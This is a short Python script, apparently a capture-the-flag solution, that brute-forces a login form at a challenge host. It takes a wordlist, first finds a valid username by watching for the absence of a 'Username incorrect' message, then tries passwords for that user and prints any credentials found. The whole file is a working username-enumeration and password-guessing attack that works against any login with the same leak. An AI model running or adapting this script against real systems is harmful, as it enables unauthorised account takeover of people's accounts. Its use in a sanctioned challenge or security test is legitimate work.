import os
import sys
import requests
from tqdm import tqdm

file = sys.argv[1]
lijst = open(file, "r", encoding="utf-8")
words = lijst.read().split('\n')

print("Searching for username")
for x in tqdm(words):
        r = requests.post("http://challenge.levitati.ng:1337/login",{"username":x,"password":"loempia"},proxies={"http":"http://localhost:8080"})
        string = "Username incorrect"
        if string not in r.text:
                user = x
                break
                
print("Searching for password")
for x in tqdm(words):
        r = requests.post("http://challenge.levitati.ng:1337/login",{"username":user,"password":x},proxies={"http":"http://localhost:8080"})
        string = "Password incorrect"
        if string not in r.text:
                print("Username: " + user)
                print("Password: " + x)
                print(r.text)
                break
